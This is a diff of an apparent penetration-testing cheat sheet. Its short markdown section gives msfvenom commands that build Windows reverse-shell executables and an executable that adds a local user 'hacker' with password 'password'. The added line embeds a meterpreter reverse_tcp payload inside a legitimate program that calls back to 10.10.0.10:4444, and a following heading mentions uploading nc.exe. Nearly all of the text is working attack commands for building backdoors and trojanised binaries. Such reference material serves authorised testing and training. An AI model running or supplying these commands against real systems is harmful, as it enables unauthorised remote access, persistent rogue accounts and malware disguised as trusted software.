@@ -54,10 +54,13 @@ Upload pages, certutil, powershell
     msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	
     msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
    
-   
 Add a user in windows with msfvenom: 
 
-    msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
+    msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe   
+    
+Embed a payload within a legitimate binary:    
+
+    msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows LHOST=10.10.0.10 LPORT=4444 -o tmp.exe -k -x 'Name.exe'    
    
 ### Netcat
 upload static binary nc.exe and invoke 
